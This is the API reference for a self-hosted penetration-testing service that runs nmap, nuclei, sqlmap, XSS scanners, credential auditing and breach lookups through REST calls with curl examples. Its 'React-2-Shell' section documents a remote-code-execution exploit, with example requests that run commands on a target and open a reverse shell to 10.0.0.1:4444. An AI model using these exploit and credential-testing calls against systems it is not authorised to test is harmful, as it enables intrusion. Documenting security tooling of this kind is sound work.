# API Complete Reference

> **Base URL**: `http://<host>:5000`
> **Authentication**: All endpoints require `X-API-Key` header
> **Content-Type**: `application/json` for POST requests
> **Rate Limit**: Configurable per-IP per-hour (default: 100 requests/hour)

---

## Table of Contents

| # | Section | Description |
|---|---------|-------------|
| 1 | [Authentication](#1-authentication) | API key setup |
| 2 | [Scan Endpoint](#2-scan-endpoint) | Launch any individual tool |
| 3 | [Composite Scanners](#3-composite-scanners) | Multi-tool orchestrated scans |
| 4 | [Interactive Modules](#4-interactive-modules) | Scans with user confirmations |
| 5 | [Job Management](#5-job-management) | Status, results, cancel |
| 6 | [CMS Confirmation](#6-cms-confirmation-flow) | CMS detection workflow |
| 7 | [Monitoring & Admin](#7-monitoring--admin) | Health, metrics, db-stats |
| 8 | [Supported Tools Reference](#8-supported-tools-reference) | All 28 tools with parameters |
| 9 | [Normalized Output](#9-normalized-output) | Standardized result format |
| 10 | [Error Reference](#10-error-reference) | Error codes and messages |

---

## 1. Authentication

All endpoints require the `X-API-Key` header. The API key is set via the `API_KEY` environment variable on the server.

```bash
# Set API key (server-side)
export API_KEY="your-secret-api-key"

# Use API key (client-side)
curl -H "X-API-Key: your-secret-api-key" http://localhost:5000/health
```

**Environment Variables:**

| Variable | Required | Description |
|----------|----------|-------------|
| `API_KEY` | Yes | Authentication key for all endpoints |
| `SHODAN_API_KEY` | No | Required for `shodansearch` tool |
| `VIRUSTOTAL_API_KEY` | No | Required for `virustotal` tool |
| `WPSCAN_API_KEY` | No | Single WPScan API key |
| `WPSCAN_API_KEYS` | No | Comma-separated WPScan keys (rotation) |

---

## 2. Scan Endpoint

### POST `/scan`

Launch any individual security tool scan.

**Request Body:**
```json
{
  "tool": "<tool_name>",
  "target": "<target>",
  "params": { }
}
```

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `tool` | string | Yes | Tool name from [supported tools](#8-supported-tools-reference) |
| `target` | string | Yes | Target domain, IP, or URL |
| `params` | object | No | Tool-specific parameters (see tool reference below) |

**Response** `202 Accepted`:
```json
{
  "job_id": "uuid",
  "status": "queued",
  "tool": "nmap",
  "target": "example.com",
  "message": "nmap scan started",
  "estimated_time": "600 seconds"
}
```

### curl Examples — Individual Tools

#### WAF Detection
```bash
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "wafw00f", "target": "example.com"}'
```

#### Nmap Network Scan
```bash
# Quick scan (type 1 — default)
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "nmap", "target": "example.com"}'

# Deep scan with CVE detection
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "nmap", "target": "example.com", "params": {"type": "2", "enable_cve": true, "ports": "1-65535"}}'
```

#### Nuclei Vulnerability Scanner
```bash
# Default scan
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "nuclei", "target": "https://example.com"}'

# Custom severity and rate limit
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "nuclei", "target": "https://example.com", "params": {"severity": "critical,high", "rate_limit": 50, "tags": "cve", "follow_redirects": true}}'
```

#### Directory Enumeration (Dirb)
```bash
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "dirb", "target": "http://example.com", "params": {"recursive": false}}'
```

#### WhatWeb Technology Detection
```bash
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "whatweb", "target": "example.com"}'
```

#### Nikto Web Vulnerability Scanner
```bash
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "nikto", "target": "http://example.com"}'
```

#### Masscan Port Scanner
```bash
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "masscan", "target": "192.168.1.0/24", "params": {"ports": "1-1000", "rate": "5000"}}'
```

#### SSL/TLS Scanner
```bash
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "sslscan", "target": "example.com", "params": {"port": "443"}}'
```

#### HTTPX HTTP Prober
```bash
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "httpx", "target": "example.com", "params": {"tech_detect": true, "status_code": true, "title": true, "follow_redirects": true}}'
```

#### OpenVAS/GVM Vulnerability Scanner
```bash
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "gvm", "target": "192.168.1.1", "params": {"use_tls": false, "socket_path": "/run/gvmd/gvmd.sock"}}'
```

#### Domain Finder
```bash
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "domainfinder", "target": "example.com", "params": {"ssl_certificates": true, "reverse_whois": true, "minimum_weight": 0.5}}'
```

#### Cloud Security Scanner
```bash
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "cloudscanner", "target": "example.com", "params": {"detect_provider": true, "bucket_enumeration": true, "check_vulnerabilities": true}}'
```

#### Password Auditor
```bash
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "passwordauditor", "target": "192.168.1.1", "params": {"ports": "22,3306,5432", "default_creds": true, "delay": 1}}'
```

#### Drupal Scanner
```bash
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "drupalscanner", "target": "http://drupal-site.com"}'
```

#### Joomla Scanner
```bash
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "joomlascanner", "target": "http://joomla-site.com"}'
```

#### SharePoint Scanner
```bash
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "sharepointscanner", "target": "https://sharepoint.example.com"}'
```

#### CVE Search
```bash
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "cvesearch", "target": "example.com", "params": {"use_nuclei": true, "use_nmap": true, "severity_filter": "critical,high"}}'
```

#### SQL Injection Testing (SQLMap)
```bash
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "sqlmap", "target": "http://example.com/page?id=1"}'
```

#### Subdomain Finder
```bash
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "subdomainfinder", "target": "example.com", "params": {"use_virustotal": false}}'
```

#### Shodan Intelligence Gathering
```bash
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "shodansearch", "target": "example.com"}'
```

#### XSS Testing (XSStrike)
```bash
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "xssstrike", "target": "http://example.com/search?q=test", "params": {"timeout": 10, "deep_domxss": true}}'
```

#### VirusTotal Domain Analysis
```bash
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "virustotal", "target": "example.com"}'
```

#### Breach Database Search (BreachVIP)
```bash
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "breachvip", "target": "user@example.com", "params": {"wildcard": false, "case_sensitive": false}}'
```

#### Dalfox XSS Scanner
```bash
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "dalfox", "target": "http://example.com/search?q=test", "params": {"follow_redirects": true}}'
```

#### WordPress Scanner (WPScan)
```bash
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "wpscan", "target": "http://wordpress-site.com", "params": {"enumerate": "vp,vt,tt,cb,dbe,u,m", "detection_mode": "mixed"}}'
```

#### HTTP Header Audit
```bash
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "headeraudit", "target": "https://example.com", "params": {"check_deprecated": true}}'
```

#### CMS Scanner (Auto-Detect)
```bash
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "cmsscan", "target": "http://example.com", "params": {"cms_type": "auto", "deep_scan": true, "enumerate_users": true}}'
```

#### React-2-Shell (R2C) Exploit
```bash
# Vulnerability scan
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "React-2-Shell", "target": "http://react-app.com", "params": {"scan": true}}'

# Command execution (if vulnerable)
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "React-2-Shell", "target": "http://react-app.com", "params": {"command": "id"}}'

# Reverse shell (if vulnerable)
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "React-2-Shell", "target": "http://react-app.com", "params": {"lhost": "10.0.0.1", "lport": 4444, "shell": "bash"}}'
```

---

## 3. Composite Scanners

Composite scanners orchestrate multiple tools in sequence for comprehensive assessments. Each has `light` and `deep` scan levels.

### POST `/webscan`

Comprehensive web application security assessment.

**Tools Used (light):** httpx, whatweb, wafw00f, nmap, virustotal, shodansearch, sslscan, nuclei, cvesearch, dirb, nikto
**Tools Used (deep):** All light tools + XSS testing, SQL injection, CMS-specific scanners

```bash
# Light web scan
curl -X POST http://localhost:5000/webscan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"target": "example.com"}'

# Deep web scan with XSS and SQLi testing
curl -X POST http://localhost:5000/webscan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"target": "example.com", "params": {"scan_level": "deep", "enable_xss": true, "enable_sqli": true, "cms_scan": "auto", "cms_confirm": true}}'
```

**Params:**

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `scan_level` | string | `"light"` | `"light"` or `"deep"` |
| `enable_cve` | bool | `true` | CVE detection in nmap/nuclei |
| `enable_xss` | bool | `false` | XSS testing (deep mode) |
| `enable_sqli` | bool | `false` | SQL injection testing (deep mode) |
| `cms_scan` | string | `"auto"` | `"auto"`, `"wordpress"`, `"drupal"`, `"joomla"`, `"none"` |
| `cms_confirm` | bool | `true` | Ask for CMS confirmation |
| `cms_confirm_timeout` | int | `60` | Seconds to wait for CMS confirmation |
| `nuclei_severity` | string | varies | e.g. `"critical,high"` |
| `nmap_type` | string | varies | `"1"` (light) or `"2"` (deep) |

---

### POST `/networkscan`

Network infrastructure security assessment.

**Tools Used (light):** masscan, nmap (with CVE scripts), shodansearch, sslscan, cvesearch
**Tools Used (deep):** All light tools + GVM/OpenVAS

```bash
# Light network scan
curl -X POST http://localhost:5000/networkscan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"target": "192.168.1.0/24"}'

# Deep network scan with GVM
curl -X POST http://localhost:5000/networkscan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"target": "192.168.1.0/24", "params": {"scan_level": "deep", "ports": "1-65535", "enable_gvm": true}}'
```

**Params:**

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `scan_level` | string | `"light"` | `"light"` or `"deep"` |
| `ports` | string | `"1-1000"` / `"1-65535"` | Port range |
| `enable_cve` | bool | `true` | CVE detection |
| `enable_gvm` | bool | `false` | Enable OpenVAS scanning |
| `nmap_type` | string | varies | Nmap scan type |

---

### POST `/cloudscan`

Cloud environment security assessment.

**Tools Used (light):** subdomainfinder, shodansearch, cloudscanner, httpx
**Tools Used (deep):** All light tools + nuclei (cloud templates)

```bash
# Light cloud scan
curl -X POST http://localhost:5000/cloudscan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"target": "example.com"}'

# Deep cloud scan
curl -X POST http://localhost:5000/cloudscan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"target": "example.com", "params": {"scan_level": "deep", "cloud_provider": "aws", "enumerate_buckets": true}}'
```

**Params:**

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `scan_level` | string | `"light"` | `"light"` or `"deep"` |
| `cloud_provider` | string | `"auto"` | `"auto"`, `"aws"`, `"gcp"`, `"azure"` |
| `enumerate_buckets` | bool | `true` | S3/blob/GCS bucket enumeration |

---

## 4. Interactive Modules

These modules pause during execution and request user confirmation before proceeding with potentially invasive phases.

### POST `/discovery`

Asset discovery with interactive confirmations.

**Phases:** Subdomain enumeration → Port scanning → API endpoint detection → Cloud asset discovery

```bash
# Start discovery scan
curl -X POST http://localhost:5000/discovery \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"target": "example.com", "params": {"scope": "standard", "interactive": true, "confirm_threshold": 10}}'
```

**Params:**

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `scope` | string | `"standard"` | `"minimal"`, `"standard"`, `"full"` |
| `interactive` | bool | `true` | Enable user confirmations |
| `confirm_threshold` | int | `10` | Min assets to trigger confirmation |

**Response** `202 Accepted`:
```json
{
  "job_id": "uuid",
  "status": "queued",
  "scan_type": "discovery",
  "target": "example.com",
  "scope": "standard",
  "interactive": true,
  "endpoints": {
    "check_confirmations": "/confirmations/<job_id>",
    "respond_to_confirmation": "/confirm/<job_id>/{request_id}",
    "check_status": "/status/<job_id>",
    "get_results": "/results/<job_id>"
  }
}
```

---

### POST `/authtest`

Authentication security testing with interactive confirmations.

**Phases:** Login form analysis → JWT analysis → Session security → OAuth testing → Rate limiting

```bash
# Start auth test
curl -X POST http://localhost:5000/authtest \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"target": "https://example.com", "params": {"scope": "standard", "interactive": true}}'

# With JWT token analysis
curl -X POST http://localhost:5000/authtest \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"target": "https://example.com", "params": {"scope": "full", "jwt_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}}'
```

**Params:**

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `scope` | string | `"standard"` | `"minimal"`, `"standard"`, `"full"` |
| `interactive` | bool | `true` | Enable confirmations |
| `jwt_token` | string | — | Optional JWT to analyze |

---

## 5. Job Management

### GET `/status/{job_id}`

Get the current status and progress of a scan.

```bash
curl -H "X-API-Key: YOUR_KEY" http://localhost:5000/status/<job_id>
```

**Response:**
```json
{
  "job_id": "uuid",
  "tool": "nmap",
  "target": "example.com",
  "status": "running",
  "created_at": "2026-03-16 10:30:00 IST",
  "params": {},
  "progress": {
    "phase": "scanning",
    "percent": 45,
    "message": "Port scanning in progress..."
  }
}
```

**Possible `status` values:** `queued`, `running`, `completed`, `failed`, `cancelled`, `waiting_confirmation`

---

### GET `/results/{job_id}`

Get scan results. Supports both raw and normalized output formats.

```bash
# Raw results
curl -H "X-API-Key: YOUR_KEY" http://localhost:5000/results/<job_id>

# Normalized results (standardized format with risk scores)
curl -H "X-API-Key: YOUR_KEY" "http://localhost:5000/results/<job_id>?normalized=true"

# Summary only (lightweight — for dashboards)
curl -H "X-API-Key: YOUR_KEY" "http://localhost:5000/results/<job_id>?normalized=true&summary_only=true"
```

**Query Parameters:**

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `normalized` | string | `"false"` | Set to `"true"` for standardized output |
| `summary_only` | string | `"false"` | With `normalized=true`, returns summary only |

**Raw Response:**
```json
{
  "job_id": "uuid",
  "tool": "nmap",
  "target": "example.com",
  "status": "completed",
  "result": { ... },
  "completed_at": "2026-03-16 10:35:00 IST",
  "completed_in": "5 minutes 12 seconds"
}
```

See [Section 9](#9-normalized-output) for the normalized response format.

---

### POST `/cancel/{job_id}`

Cancel a running or queued scan.

```bash
curl -X POST -H "X-API-Key: YOUR_KEY" http://localhost:5000/cancel/<job_id>
```

**Response:**
```json
{
  "job_id": "uuid",
  "status": "cancelled",
  "message": "Job cancelled successfully"
}
```

---

### GET `/jobs`

List all jobs with optional filtering.

```bash
# List recent 50 jobs
curl -H "X-API-Key: YOUR_KEY" http://localhost:5000/jobs

# Filter by status
curl -H "X-API-Key: YOUR_KEY" "http://localhost:5000/jobs?status=running&limit=20"
```

**Query Parameters:**

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `limit` | int | `50` | Max jobs to return |
| `status` | string | — | Filter: `queued`, `running`, `completed`, `failed`, `cancelled` |

**Response:**
```json
{
  "total_jobs": 150,
  "active_scans": 3,
  "jobs": [
    {
      "job_id": "uuid",
      "tool": "nmap",
      "target": "example.com",
      "status": "completed",
      "created_at": "2026-03-16 10:30:00 IST"
    }
  ]
}
```

---

## 6. CMS Confirmation Flow

During a webscan, if a CMS (WordPress, Drupal, Joomla) is auto-detected, the scan pauses for user confirmation before running the CMS-specific scanner.

### GET `/cms-status/{job_id}`

Check if a CMS has been detected and whether confirmation is pending.

```bash
curl -H "X-API-Key: YOUR_KEY" http://localhost:5000/cms-status/<job_id>
```

**Response:**
```json
{
  "job_id": "uuid",
  "cms_detected": true,
  "cms": "wordpress",
  "pending_confirmation": true,
  "confirmed": false,
  "requested_at": "2026-03-16 10:32:00 IST",
  "message": "WordPress detected - awaiting confirmation"
}
```

### POST `/confirm-cms/{job_id}`

Confirm or decline the CMS-specific scan.

```bash
# Confirm CMS scan
curl -X POST http://localhost:5000/confirm-cms/<job_id> \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"confirm": true}'

# Decline CMS scan
curl -X POST http://localhost:5000/confirm-cms/<job_id> \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"confirm": false}'
```

**Response:**
```json
{
  "job_id": "uuid",
  "cms": "wordpress",
  "confirmed": true,
  "message": "CMS scan confirmed - running wordpress scanner"
}
```

---

## 7. Monitoring & Admin

### GET `/health`

Health check endpoint.

```bash
curl -H "X-API-Key: YOUR_KEY" http://localhost:5000/health
```

**Response:**
```json
{
  "status": "healthy",
  "active_scans": 2,
  "total_jobs": 150,
  "supported_tools": ["wafw00f", "nmap", "nuclei", ...],
  "timestamp": "2026-03-16 10:30:00 IST"
}
```

### GET `/metrics`

Prometheus-style metrics (plain text).

```bash
curl -H "X-API-Key: YOUR_KEY" http://localhost:5000/metrics
```

**Response:**
```
# HELP active_scans Current number of active scans
# TYPE active_scans gauge
active_scans 2

# HELP total_jobs Total number of jobs in database
# TYPE total_jobs gauge
total_jobs 150

# HELP jobs_by_status Number of jobs by status
# TYPE jobs_by_status gauge
jobs_by_status{status="completed"} 120
jobs_by_status{status="running"} 2
jobs_by_status{status="failed"} 5
```

### GET `/db-stats`

Database statistics for debugging.

```bash
curl -H "X-API-Key: YOUR_KEY" http://localhost:5000/db-stats
```

### GET `/wpscan-keys`

WPScan API key rotation status and usage.

```bash
curl -H "X-API-Key: YOUR_KEY" http://localhost:5000/wpscan-keys
```

**Response:**
```json
{
  "tool": "wpscan",
  "api_key_rotation": {
    "total_keys": 3,
    "current_key_index": 1,
    "total_remaining_today": 55
  },
  "message": "55 requests remaining today across 3 key(s)"
}
```

### POST `/reset-active-scans`

Manually reset the active scan counter (useful if counter gets out of sync).

```bash
curl -X POST -H "X-API-Key: YOUR_KEY" http://localhost:5000/reset-active-scans
```

**Response:**
```json
{
  "message": "Active scans counter reset successfully",
  "previous_count": 5,
  "new_count": 0
}
```

---

## 8. Supported Tools Reference

### Individual Tools

| Tool | Category | Timeout | Description | Key Params |
|------|----------|---------|-------------|------------|
| `wafw00f` | Reconnaissance | 120s | WAF Detection | — |
| `nmap` | Network Mapping | 600s | Port/service scan | `type` (`"1"`,`"2"`), `enable_cve`, `ports`, `max_duration` |
| `nuclei` | Vulnerability Scanning | None | Template-based vuln scanner | `severity`, `tags`, `exclude_tags`, `templates`, `rate_limit`, `concurrency`, `timeout`, `retries`, `follow_redirects`, `passive`, `automatic_scan` |
| `dirb` | Directory Enumeration | None | Directory brute-force | `recursive`, `user_agent` |
| `whatweb` | Reconnaissance | 60s | Web technology detection | — |
| `nikto` | Web Vulnerability | 1800s | Web server scanner | — |
| `masscan` | Port Scanner | 300s | High-speed port scanner | `ports`, `rate`, `max_duration` |
| `sslscan` | Encryption Analysis | 120s | SSL/TLS scanner | `port` |
| `httpx` | HTTP Probing | 60s | HTTP host verification | `status_code`, `title`, `tech_detect`, `ip`, `cdn`, `method`, `websocket`, `cname`, `asn`, `content_length`, `response_time`, `web_server`, `follow_redirects`, `include_response`, `screenshot`, `probe`, `threads`, `rate_limit`, `timeout`, `retries`, `match_code`, `filter_code` |
| `gvm` | Vulnerability Scanning | 3600s | OpenVAS vulnerability scanner | `use_tls`, `host`, `port`, `socket_path` |
| `domainfinder` | Discovery | 300s | Domain reconnaissance | `ssl_certificates`, `builtwith`, `reverse_whois`, `minimum_weight` |
| `cloudscanner` | Cloud Security | 900s | Cloud security assessment | `detect_provider`, `check_vulnerabilities`, `bucket_enumeration` |
| `passwordauditor` | Auth Testing | 1800s | Credential testing | `ports`, `services`, `username_list`, `password_list`, `default_creds`, `delay` |
| `drupalscanner` | CMS Scanning | 300s | Drupal vulnerability scanner | — |
| `joomlascanner` | CMS Scanning | 300s | Joomla vulnerability scanner | — |
| `sharepointscanner` | CMS Scanning | 300s | SharePoint security scanner | — |
| `cvesearch` | Vulnerability Scanning | 900s | CVE discovery | `use_nuclei`, `use_nmap`, `severity_filter` |
| `sqlmap` | Injection Testing | 1800s | SQL injection scanner | — |
| `subdomainfinder` | Discovery | 600s | Subdomain enumeration | `use_virustotal` |
| `shodansearch` | Intelligence | 120s | Shodan search | — (requires `SHODAN_API_KEY`) |
| `xssstrike` | Injection Testing | 600s | XSS detection | `timeout`, `user_agent`, `cookie`, `headers`, `method`, `data`, `mining_dict`, `mining_dom`, `follow_redirects`, `silence`, `deep_domxss` |
| `virustotal` | Reputation | 60s | Domain analysis | — (requires `VIRUSTOTAL_API_KEY`) |
| `breachvip` | Exposure | 120s | Breach database search | `wildcard`, `case_sensitive` |
| `dalfox` | Injection Testing | 300s | Advanced XSS scanner | `follow_redirects`, `user_agent`, `timeout` |
| `wpscan` | CMS Scanning | 600s | WordPress scanner | `enumerate`, `detection_mode`, `user_agent`, `random_user_agent`, `max_threads`, `request_timeout`, `connect_timeout`, `disable_tls_checks`, `follow_redirects` |
| `headeraudit` | Security Headers | 60s | HTTP header analysis | `follow_redirects`, `user_agent`, `timeout`, `check_deprecated` |
| `cmsscan` | CMS Scanning | 900s | Auto-detect CMS scanner | `cms_type`, `deep_scan`, `enumerate_users`, `enumerate_plugins`, `enumerate_themes` |
| `React-2-Shell` | Exploitation | 60s | React RCE exploit (CVE-2025-66478) | `scan`, `command`, `lhost`, `lport`, `shell`, `timeout`, `verify_ssl` |

### Composite Scanners

| Tool | Category | Timeout | Description |
|------|----------|---------|-------------|
| `webscan` | Web Application | 3600s | Multi-tool web assessment |
| `networkscan` | Network Infrastructure | 3600s | Multi-tool network assessment |
| `cloudscan` | Cloud Environment | 1800s | Multi-tool cloud assessment |

### Interactive Modules

| Tool | Category | Timeout | Description |
|------|----------|---------|-------------|
| `discovery` | Asset Discovery | 1800s | Interactive asset enumeration |
| `authtest` | Auth Testing | 900s | Interactive auth security testing |

---

## 9. Normalized Output

When appending `?normalized=true` to `/results/{job_id}`, the API returns standardized output with consistent structure across all 28 tools.

### Normalized Response Structure

```json
{
  "meta": {
    "scan_id": "uuid",
    "tool": "nmap",
    "scan_type": "nmap",
    "category": "network_mapping",
    "target": "example.com",
    "started_at": "2026-03-16 10:30:00 IST",
    "completed_at": "2026-03-16 10:35:00 IST",
    "duration_seconds": 312
  },
  "summary": {
    "total_findings": 15,
    "critical": 2,
    "high": 3,
    "medium": 5,
    "low": 3,
    "info": 2,
    "risk_level": "high",
    "risk_score": 78.5
  },
  "findings": [
    {
      "id": "sha256-hash",
      "title": "Open Port: 3306/tcp - MySQL",
      "severity": "high",
      "category": "exposure",
      "affected_asset": "example.com:3306",
      "description": "MySQL database exposed on port 3306.",
      "source_tool": "nmap",
      "confidence": 0.95,
      "impact": "Database may be accessible to unauthorized users.",
      "recommendation": "Restrict access to port 3306 via firewall rules.",
      "evidence": {
        "tool": "nmap",
        "additional": {"port": 3306, "service": "mysql", "version": "8.0.32"}
      },
      "references": {
        "cwe": "CWE-200",
        "owasp": null,
        "cve": null,
        "urls": null
      },
      "tags": ["port-scan", "exposure", "database"]
    }
  ],
  "tool_coverage": {
    "tools_executed": ["nmap"],
    "tools_failed": [],
    "tools_skipped": []
  },
  "owasp_compliance": { ... },
  "sans_compliance": { ... },
  "executive_summary": "The nmap scan identified 15 findings..."
}
```

### Summary-Only Response

```bash
curl -H "X-API-Key: YOUR_KEY" "http://localhost:5000/results/<job_id>?normalized=true&summary_only=true"
```

```json
{
  "scan_id": "uuid",
  "tool": "nmap",
  "target": "example.com",
  "summary": {
    "total_findings": 15,
    "critical": 2,
    "high": 3,
    "medium": 5,
    "low": 3,
    "info": 2,
    "risk_level": "high",
    "risk_score": 78.5
  },
  "executive_summary": "The nmap scan identified 15 findings..."
}
```

### Finding Severity Levels

| Level | Score Weight | Description |
|-------|-------------|-------------|
| `critical` | 40 | Immediate exploitation risk |
| `high` | 25 | Significant security issue |
| `medium` | 15 | Moderate risk |
| `low` | 5 | Minor issue |
| `info` | 0 | Informational |

### Risk Score Calculation

Risk score (0–100) is calculated from findings weighted by severity, capped at 100.

| Risk Level | Score Range |
|------------|-------------|
| `minimal` | 0 |
| `low` | 1–25 |
| `medium` | 26–50 |
| `high` | 51–75 |
| `critical` | 76–100 |

---

## 10. Error Reference

### HTTP Status Codes

| Code | Meaning |
|------|---------|
| `200` | Success |
| `202` | Scan accepted and queued |
| `400` | Bad request (invalid params, scan not completed) |
| `403` | Access denied (wrong API key or job not owned) |
| `404` | Job not found |
| `429` | Rate limit exceeded or max concurrent scans reached |
| `500` | Internal server error |

### Common Error Responses

```json
{"error": "Invalid tool", "supported_tools": ["wafw00f", "nmap", ...]}
```
```json
{"error": "Target parameter required"}
```
```json
{"error": "Rate limit exceeded", "message": "Maximum 100 requests per hour allowed"}
```
```json
{"error": "Maximum concurrent scans reached", "active_scans": 10, "max_allowed": 10}
```
```json
{"error": "Scan not completed", "status": "running"}
```
```json
{"error": "SSRF Protection: Private/internal IP not allowed"}
```
```json
{"error": "Injection attempt detected"}
```

---

## Quick Start

### Full Workflow Example

```bash
# 1. Health check
curl -H "X-API-Key: YOUR_KEY" http://localhost:5000/health

# 2. Start a scan
curl -X POST http://localhost:5000/scan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"tool": "nuclei", "target": "https://testphp.vulnweb.com"}' \
  | python3 -m json.tool

# Save the job_id from the response, then:

# 3. Check status
curl -H "X-API-Key: YOUR_KEY" http://localhost:5000/status/<job_id>

# 4. Get raw results
curl -H "X-API-Key: YOUR_KEY" http://localhost:5000/results/<job_id> \
  | python3 -m json.tool

# 5. Get normalized results
curl -H "X-API-Key: YOUR_KEY" \
  "http://localhost:5000/results/<job_id>?normalized=true" \
  | python3 -m json.tool

# 6. Get summary only
curl -H "X-API-Key: YOUR_KEY" \
  "http://localhost:5000/results/<job_id>?normalized=true&summary_only=true"
```

### Composite Scan Workflow (Webscan with CMS Confirmation)

```bash
# 1. Start webscan
JOB=$(curl -s -X POST http://localhost:5000/webscan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"target": "wordpress-site.com", "params": {"scan_level": "deep", "cms_confirm": true}}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['job_id'])")

# 2. Poll status
curl -H "X-API-Key: YOUR_KEY" http://localhost:5000/status/$JOB

# 3. Check if CMS confirmation needed
curl -H "X-API-Key: YOUR_KEY" http://localhost:5000/cms-status/$JOB

# 4. Confirm CMS scan (if detected)
curl -X POST http://localhost:5000/confirm-cms/$JOB \
  -H "Content-Type: application/json" \
  -H "X-API-Key: YOUR_KEY" \
  -d '{"confirm": true}'

# 5. Wait for completion, then get normalized results
curl -H "X-API-Key: YOUR_KEY" \
  "http://localhost:5000/results/$JOB?normalized=true" \
  | python3 -m json.tool
```
